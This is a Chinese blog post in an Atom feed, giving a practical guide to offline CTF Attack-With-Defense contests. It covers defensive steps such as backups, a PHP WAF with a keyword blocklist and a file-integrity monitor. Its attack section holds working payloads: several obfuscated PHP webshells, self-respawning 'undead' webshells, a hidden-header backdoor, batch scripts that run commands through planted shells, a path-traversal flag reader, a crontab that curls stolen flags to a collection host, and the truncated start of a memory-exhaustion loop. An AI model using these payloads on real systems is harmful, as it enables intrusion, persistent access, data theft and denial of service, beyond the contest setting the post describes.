<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mang0 的成长之路 | Mang0 | 网络安全 | 安全技术 | CTF|WEB 安全 | 数据科学安全</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://mang0.me/"/>
  <updated>2018-12-02T09:15:54.860Z</updated>
  <id>http://mang0.me/</id>
  
  <author>
    <name>Mang0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初探线下CTF-AWD模式</title>
    <link href="http://mang0.me/archives/49b464e6/"/>
    <id>http://mang0.me/archives/49b464e6/</id>
    <published>2018-12-02T09:13:50.000Z</published>
    <updated>2018-12-02T09:15:54.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初探线下CTF-AWD模式"><a href="#初探线下CTF-AWD模式" class="headerlink" title="初探线下CTF AWD模式"></a>初探线下CTF AWD模式</h1><p>祭上大牛的导图</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fsor5ddnfrj312f0p0q4s.jpg" alt=""></p><p><img src="https://i.loli.net/2018/07/11/5b45bb55a8a62.png" alt="naotu.png"></p><h2 id="0x00防御"><a href="#0x00防御" class="headerlink" title="0x00防御"></a>0x00防御</h2><p>先做好防御工作，否则一开始被打穿后面心态就容易崩</p><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><h5 id="ssh密码修改"><a href="#ssh密码修改" class="headerlink" title="ssh密码修改"></a>ssh密码修改</h5><pre><code class="bash">sudo passwd user</code></pre><h5 id="mysql密码修改"><a href="#mysql密码修改" class="headerlink" title="mysql密码修改"></a>mysql密码修改</h5><pre><code class="mysql">mysql&gt; SET PASSWORD FOR &#39;user&#39;@&#39;localhost&#39; = PASSWORD(&#39;newpass&#39;);</code></pre><h5 id="web后台密码修改"><a href="#web后台密码修改" class="headerlink" title="web后台密码修改"></a>web后台密码修改</h5><p>Web后台很有可能存在弱口令，一般都是admin/admin,admin/123456,test/test等等，同样需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的wordpress。</p><p>直接在后台管理页面进行修改</p><p>当然有些情况是比赛不允许修改后台口令，会将修改后台口令视为宕机，还要被扣分</p><h5 id="修改MongoDB密码（27017端口）"><a href="#修改MongoDB密码（27017端口）" class="headerlink" title="修改MongoDB密码（27017端口）"></a>修改MongoDB密码（27017端口）</h5><h5 id="修改Redis密码（6379端口）"><a href="#修改Redis密码（6379端口）" class="headerlink" title="修改Redis密码（6379端口）"></a>修改Redis密码（6379端口）</h5><h5 id="修改网站源码中的数据库连接配置"><a href="#修改网站源码中的数据库连接配置" class="headerlink" title="修改网站源码中的数据库连接配置"></a>修改网站源码中的数据库连接配置</h5><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><p>可以用Winscp、FileZilla之类的工具连接下载/var/www/html/下的文件做好备份 </p><pre><code># 打包目录tar -zcvf web.tar.gz /var/www/html 备份源码tar -zcf /tmp/name.tar.gz /path/web# 解包tar -zxvf archive_name.tar.gz</code></pre><h3 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h3><pre><code>备份[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysqldump -u 用户名 -p 数据库名&gt;导出的文件名mysqldump -u root -p 数据库名&gt;Test0809.sql，输入密码即可。# 备份指定的多个数据库mysqldump -u root -p --databases choose test &gt; /tmp/db.sql# 恢复备份，在mysql终端下执行：# 命令格式：source FILE_PATHsource ~/db.sql# 曾经遇到一个备份有问题可以执行下面mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql# 重置mysql密码# 方法1：用SET PASSWORD命令mysql&gt; set password for 用户名@localhost = password(&#39;新密码&#39;);# 方法2：用mysqladminmysqladmin -u用户名 -p旧密码 password 新密码</code></pre><h3 id="删除后门"><a href="#删除后门" class="headerlink" title="删除后门"></a>删除后门</h3><p>有些比赛主办方会在服务器预留后门，这时可以把备份目录用D盾之类的工具扫描一下，或者下载相同的cms来进行目录对比。有的话立刻删除，并且利用这个后门攻击其他服务器（很可能后门密码相同或者类似，可以猜解）</p><p>参考<a href="http://tinyfisher.github.io/security/2017/10/02/CTF" target="_blank" rel="external">表哥</a>的脚本，修改其中的地址、shell路径和密码即可</p><pre><code class="python">#coding=utf-8import requestsurl=&quot;http://192.168.71.&quot;url1=&quot;&quot;shell=&quot;/Upload/index.php&quot;passwd=&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot; port=&quot;80&quot;payload = {passwd: &#39;system(\&#39;cat /flag\&#39;);&#39;}f=open(&quot;webshelllist.txt&quot;,&quot;w&quot;) f1=open(&quot;firstround_flag.txt&quot;,&quot;w&quot;)for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]:     url1=url+str(i)+&quot;:&quot;+port+shell    try:        res=requests.post(url1,payload,timeout=1)        if res.status_code == requests.codes.ok:            print url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f1,url1+&quot; connect shell sucess,flag is &quot;+res.text            print &gt;&gt;f,url1+&quot;,&quot;+passwd        else:            print &quot;shell 404&quot;    except:        print url1+&quot; connect shell fail&quot;f.close()f1.close()</code></pre><h3 id="部署waf"><a href="#部署waf" class="headerlink" title="部署waf"></a>部署waf</h3><p>一般SQL注入之类的漏洞不会有过滤，可以部署waf来拖延对方时间。同理，可以在对方部署waf前利用sqlmap来跑</p><p>上传漏洞也是简单的黑名单过滤，但是可以通过部署waf来删除常规木马，拖延对方的时间</p><p>waf可以用安全狗linux版或者柠檬师傅发的:</p><pre><code class="php">&lt;?php$WAF_log = &#39;/var/tmp/web_log_&#39;;$Upload_dir = &#39;/var/tmp/upload/&#39;;error_reporting(0);function waf() {    global $Upload_dir;    if (!function_exists(&#39;getallheaders&#39;)) {        function getallheaders() {            foreach ($_SERVER as $name =&gt; $value) {                if (substr($name, 0, 5) == &#39;HTTP_&#39;) {                    $headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value;                }            }            unset($header[&#39;Accept&#39;]);            return $headers;        }    }    $get = $_GET;    $get2 = $_SERVER[&#39;QUERY_STRING&#39;];    $post = $_POST;    $post2 = @file_get_contents(&#39;php://input&#39;);    $cookie = $_COOKIE;    $header = getallheaders();    $header[&#39;url&#39;] = $_SERVER[&#39;REQUEST_METHOD&#39;] . &#39; &#39; . &#39;http://&#39; . $_SERVER[&#39;SERVER_NAME&#39;] . &#39;:&#39; . $_SERVER[&quot;SERVER_PORT&quot;] . $_SERVER[&quot;REQUEST_URI&quot;];    $files = $_FILES;    $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];    $method = $_SERVER[&#39;REQUEST_METHOD&#39;];    $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;];    if (!empty($files)) {        foreach ($_FILES as $key =&gt; $value) {            $files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]);            move_uploaded_file($_FILES[$key][&#39;tmp_name&#39;], $Upload_dir . $_FILES[$key][&quot;name&quot;] . &#39;.&#39; . time());            file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;lemon&quot;);        }    }    unset($header[&#39;Accept&#39;]);    $input = array(&quot;Header&quot; =&gt; $header, &quot;Get&quot; =&gt; $get, &quot;Get2&quot; =&gt; $get2, &quot;Cookie&quot; =&gt; $cookie, &quot;Post&quot; =&gt; $post, &quot;Post2&quot; =&gt; $post2, &quot;File&quot; =&gt; $files);    logging($input);    $pattern = &quot;/select|insert|update|delete|and|or|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;;    $pattern .= &quot;|file_put_contents|fwrite|curl|system|eval|assert|file_get_contents&quot;;    $pattern .= &quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;;    $pattern .= &quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec/i&quot;;}function logging($var) {    global $WAF_log;    $tmp = &quot;\n[&quot; . date(&#39;y-m-d H:i:s&#39;) . &quot;]\n&quot;;    foreach ($var as $k =&gt; $v) {        if (!empty($v)) {            $tmp .= $k . &quot; : &quot; . print_r($v, true);        }    }    file_put_contents($WAF_log . date(&#39;H&#39;, time()), $tmp . &quot;\n\r&quot;, FILE_APPEND);}waf();?&gt;</code></pre><p>在PHP文件里include这个waf即可，要比<a href="http://www.safedog.cn/install_desc_website.html" target="_blank" rel="external">安全狗</a>麻烦点</p><pre><code>安装安全狗https://zhuanlan.zhihu.com/p/25364552</code></pre><p>使用方法：</p><p>(1).将waf.php传到要包含的文档的目录</p><p>(2).在页面中加入防护，有两种做法，根据情况二选一即可：</p><p>a).在所需要防护的页面加入代码</p><pre><code>require_once(&#39;./datawaf.php&#39;);</code></pre><p>就可以做到页面防注入、跨站</p><p>如果想整站防注，就在网站的一个公用文档中，如数据库链接文档config.inc.php中！</p><p>添加require_once(‘waf.php’);来调用本代码</p><p>常用php系统添加文档</p><pre><code>PHPCMS V9 \phpcms\base.phpPHPWIND8.7 \data\sql_config.phpDEDECMS5.7 \data\common.inc.phpDiscuzX2   \config\config_global.phpWordpress   \wp-config.phpMetinfo   \include\head.php</code></pre><p>b).在每个文档最前加上代码</p><p>在php.ini中找到:</p><pre><code>Automatically add files before or after any PHP document.auto_prepend_file = 360_safe3.php路径;</code></pre><h5 id="有root权限"><a href="#有root权限" class="headerlink" title="有root权限"></a>有root权限</h5><p>那麽，这样就简单了，直接写在配置中。</p><p>vim php.ini</p><p>auto_append_file = “/dir/path/phpwaf.php”</p><p>重启Apache或者php-fpm就能生效了。</p><p>当然也可以写在 .user.ini 或者 .htaccess 中。</p><p>php_value auto_prepend_file “/dir/path/phpwaf.php”</p><h5 id="只有user权限"><a href="#只有user权限" class="headerlink" title="只有user权限"></a>只有user权限</h5><p>没写系统权限就只能在代码上面下手了，也就是文件包含。</p><p>这钟情况又可以用不同的方式包含。</p><p>如果是框架型应用，那麽就可以添加在入口文件，例如index.php，</p><p>如果不是框架应用，那麽可以在公共配置文件config.php等相关文件中包含。</p><pre><code>include(&#39;phpwaf.php&#39;);</code></pre><p>还有一种是替换index.php，也就是讲index.php改名为index2.php，然后讲phpwaf.php改成index.php。</p><p>当然还没完，还要在原phpwaf.php中包含原来的index.php。</p><pre><code>index.php -&gt; index2.phpphpwaf.php -&gt; index.phpinclude(&#39;index2.php&#39;);</code></pre><p>至于你想用哪种方式，看你心情咯，你开心就好。</p><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>文件监控，会将新文件或者当文件被修改时立即恢复</p><pre><code class="python"># -*- coding: utf-8 -*-# @Author: Nearg1e -- 2016-06-30 10:08:35 --0v0--# v demo 0.21 修改了备份的webshell会自己坑自己的情况# todo: windows下不支持中文目录#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = {}      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;Special_string = &#39;drops_log&#39;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = {    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),}def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#39;rb&#39;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = {}    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#39;bak&#39;])if __name__ == &#39;__main__&#39;:    print u&#39;---------start------------&#39;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#39;[*] pre work end!&#39;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#39;[*] &#39; + getUnicode(time.ctime())</code></pre><p>上个文档监控的脚本，这个确实给我们帮了大忙，它会检测目录下过去一段时间内是否有文档改动然后备份该文档并将其删除，这里主要用到的命令就是</p><p>find -name ‘*.php’ -mmin -10</p><p>这样就会找出过去10分钟发生改动的文档，我也先试着运行了一下命令，然后就是一大片木马展示在你眼前，当时的心情真是难以言喻，赶紧备份删马，上监控脚本，</p><h3 id="查找常见备份文档"><a href="#查找常见备份文档" class="headerlink" title="查找常见备份文档"></a>查找常见备份文档</h3><pre><code># 例如bak文档find / -name &quot;*.bak&quot;</code></pre><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>可以在机器上利用tcpdump进行流量抓取</p><pre><code class="bash">sudo tcpdump -s 0 port xxxx -w flow.pcap</code></pre><p>追踪下tcp流，溯源</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>tail -f *.log，看日志，不言而喻，抓他们的payload并利用；</p><p>php脚本</p><pre><code class="php">&lt;?phpdate_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip       = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;];   //访问者要访问的文件名$parameter   = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time     =   date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\r\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt;</code></pre><p>一些日志分析工具</p><ol><li>LogForensics 腾讯实验室 <a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">https://security.tencent.com/index.php/opensource/detail/15</a></li><li>北风飘然@金乌网络安全实验室 <a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">http://www.freebuf.com/sectool/126698.html</a></li><li>网络ID为piaox的安全从业人员： <a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">http://www.freebuf.com/sectool/110644.html</a></li><li>网络ID：SecSky <a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">http://www.freebuf.com/sectool/8982.html</a></li><li>网络ID：鬼魅羊羔<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/96675.html</a></li></ol><pre><code># 日志地址/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/</code></pre><h2 id="0x01-攻击"><a href="#0x01-攻击" class="headerlink" title="0x01 攻击"></a>0x01 攻击</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>主机发现可以用httpscan这个工具  ./httpscan.py 10.20.30.0/24 –t 10</p><p>端口扫描用nmap</p><pre><code># 使用httpscan脚本./httpscan.py 172.16.0.0/24 –t 10# masscanmasscan -p 80 172.16.0.0/24# nmapnmap –sn 172.16.0.0/24</code></pre><h3 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h3><p>比赛刚开始拼手速，前面提到了一开始需要先讲本机ssh密码和mysql密码改了，同时队友可以试试其他机器的，万一所有机器的口令密码一样就美滋滋了</p><p>除了系统层面的口令外，还要考虑下web后台口令</p><h3 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h3><p>在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这个是送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）</p><p>将服务器中web目录下载到本地，利用D盾扫描，一般就可以发现预留后门：</p><pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h3 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h3><ul><li>Getshell：<ul><li>官方后门、文件上传</li><li>文件写入、文件包含</li><li>命令注入、反序列化</li><li>Redis写shell</li><li>Mysql写shell</li></ul></li><li>直接读文件：<ul><li>SSRF</li><li>任意文件读取</li><li>XXE</li><li>文件上传</li><li>rce</li><li>文件包含</li><li>Sqli</li></ul></li></ul><p>sql注入一般没有防护（对方部署的waf除外），可以用sqlmap跑，再利用<code>—sql-shell</code>执行<code>select load_file(‘/flag’);</code>即可得到flag，也可以利用<code>into outfile</code>写木马维持权限，但要根据实际情况，可能会遇到权限问题。用sqlmap跑比较耗时，可以利用payload写一个python，自动化进行攻击：</p><p>上传漏洞也可能只是简单的黑名单或者解析漏洞</p><p>文件包含一般可以跨目录读取flag</p><pre><code>def include(host): r=requests. get(url=&quot;http://%s/?t=../../../../../../flag&quot;% host)flags=re. findall(r&#39;^(.+?)&lt;&#39;,r. content)if flags: return flags[e]else:return &quot;error pwn!&quot;</code></pre><p>命令执行</p><p>拿到命令执行漏洞后执行crontab</p><pre><code># 参考# http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;</code></pre><h4 id="非常规一句话"><a href="#非常规一句话" class="headerlink" title="非常规一句话"></a>非常规一句话</h4><p>一些非常规的一句话木马可以防止对方通过你种下的一句话来攻击别的队伍拿到分数</p><pre><code class="php">&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;连接方式：?2=assert密码：1</code></pre><pre><code class="php">&lt;?php$a=chr(96^5);$b=chr(57^79);$c=chr(15^110);$d=chr(58^86);$e=&#39;($_REQUEST[C])&#39;;@assert($a.$b.$c.$d.$e);?&gt;连接方式：?b=))99(rhC(tseuqeR+lave</code></pre><pre><code class="php">&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[&#39;n985de9&#39;];if(isset($s22)){eval($s21($s22));}?&gt;连接方式：配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0</code></pre><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>不死马，访问后会一直生成.config.php的一句话。解决方案：重启apache或者写个脚本一直kill这个进程</p><pre><code class="php">&lt;?php    set_time_limit(0);    ignore_user_abort(1);    unlink(__FILE__);    while(1){        file_put_contents(&#39;./.config.php&#39;,&#39;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt;&#39;);        system(&#39;chmod 777 .config.php&#39;);        touch(&quot;./.config.php&quot;,mktime(20,15,1,11,28,2016));        usleep(100);        }?&gt;</code></pre><p>这个不死马运行后会删除自己，一直生成一个.config.php，和上面的类似</p><p>tips: <code>.config.php</code> 前面使用一个点，能很好的隐藏文档。</p><pre><code class="php">&lt;?php    set_time_limit(0);     ignore_user_abort(1);     unlink(__FILE__);     while(1){         file_put_contents(&#39;.config.php&#39;,&#39;&lt;?php @eval($_POST[&quot;password&quot;]);?&gt;&#39;);         sleep(5);    }</code></pre><p>素质低的人则会放置一个md5马，比如</p><pre><code>&lt;?phpif(md5($_POST[&#39;pass&#39;])==&#39;e5e47c6c69adcf1e7681a0bb384dfe44&#39;)@eval($_POST[&#39;cmd&#39;]);?&gt;密码Mang0sec</code></pre><p>如果素质低的人又很猥琐，像 <a href="https://www.saowen.com/rd/aHR0cDovL2Jsb2cuMTYzLmNvbS9wYXNzdzBhX2QvYmxvZy9zdGF0aWMvMjUwODA3MDYxMjAxNzYxMzExMzg1OTY5MS8=" target="_blank" rel="external">rootrain</a> 这种就是。那就是利用 <code>header</code> ，最后综合起来就是</p><pre><code>&lt;?phpecho &#39;hello&#39;;if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;) if (@$_SERVER[&#39;HTTP_USER_AGENT&#39;] == &#39;flag&#39;){ $test= &#39;flag&#39;;    header(&quot;flag:$test&quot;);}?&gt;</code></pre><p>放进 <code>config.php</code> 效果最好，因为一般很少人去看这个。</p><h4 id="不死马的解决方案"><a href="#不死马的解决方案" class="headerlink" title="不死马的解决方案"></a>不死马的解决方案</h4><p>先查看进程对应的pid，</p><p><code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。再执行以下</p><pre><code class="php">&lt;?phpwhile (1) {    $pid=1234;    @unlink(&#39;config.php&#39;);    exec(&#39;kill -9 $pid&#39;);}?&gt;</code></pre><p>（2）重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文档夹。</p><h4 id="获取flag的方式"><a href="#获取flag的方式" class="headerlink" title="获取flag的方式"></a>获取flag的方式</h4><p>线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。</p><p>最好能写一个批量上传的，结合批量访问。批量访问参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="external">PHP-定时任务</a><br>或者</p><pre><code>#!/bin/bashwhile truedo    flag=$(curl &#39;http://172.16.4.42:800&#39;)    curl --cookie &quot;PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD&quot; --data &quot;key=&quot;${flag} &quot;http://172.16.4.42/index.php/wargame/submit&quot;    sleep 1sdone</code></pre><h3 id="一句话批量（py2-3-通用）"><a href="#一句话批量（py2-3-通用）" class="headerlink" title="一句话批量（py2 3 通用）"></a>一句话批量（py2 3 通用）</h3><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><pre><code># -*- coding:utf-8 -*-import requests# ------------------------------------- CONFIG -----------------------------------# 目标网段ips_suffix = &#39;192.168.1.&#39;ip_first = 103ip_end = 105# 目标协议 http or httpsschema = &#39;http&#39;# shell相对路径path = &#39;/temp/shell.php&#39;# headersheaders = {&#39;USER-AGENT&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#39;}# cookies       直接burp抓到的cookie即可cookie = &#39;PHPSESSID=eooaqev53m4sqft7csm55eh1l5&#39; # burp抓到的cookie替换此处# shell密码shell_pass = &#39;CCcKNiFeee&#39;# 执行的系统命令exec_command = &#39;whoami&#39;# -------------------------------------- parama -------------------------------------cookies = {}cookie = cookie.split(&#39;;&#39;)for one_cookie in cookie:    key,value = one_cookie.split(&#39;=&#39;,1)    cookies[key.strip(&#39; &#39;)] = valuedata = {shell_pass:&#39;system(&quot;{exec_command}&quot;);&#39;.format(exec_command=exec_command)}# -------------------------------------- attrack ------------------------------------for ip in range(ip_first,ip_end+1):    shell_url = schema + &#39;://&#39; + ips_suffix + str(ip) + path    try:        result = requests.post(shell_url,headers=headers,cookies=cookies,data=data,timeout=3).text        print (result)    except:        print (shell_url + &#39;\tTIMEOUT!!!&#39;)</code></pre><h2 id="0x03-一些小tips"><a href="#0x03-一些小tips" class="headerlink" title="0x03 一些小tips"></a>0x03 一些小tips</h2><p>当怀疑某个进程是受到攻击后创建的shell进程，可以分析这个进程是否有socket连接</p><pre><code>netstat -antulp        #查看连接internet的进程ls /proc/&lt;进程pid&gt;/fd -l | grep socket: | wc -l        #查看指定进程socket连接数的命令</code></pre><p>类似的可以查看是否有管道连接</p><pre><code>ls /proc/&lt;进程pid&gt;/fd -l | grep pipe: | wc -l</code></pre><p>如果有连接，kill掉进程</p><p>最后</p><h2 id="0x04-搅屎"><a href="#0x04-搅屎" class="headerlink" title="0x04 搅屎"></a>0x04 搅屎</h2><p>常驻内存之后，进入死循环。</p><p>循环内部是实现无效複製自身并且访问web服务的功能。</p><p>执行的后果就是内存爆炸，php就GG了，严重点的话，Docker也GG。</p><pre><code>&lt;?php    set_time_limit(0);    ignore_user_abort(true);    while(1){        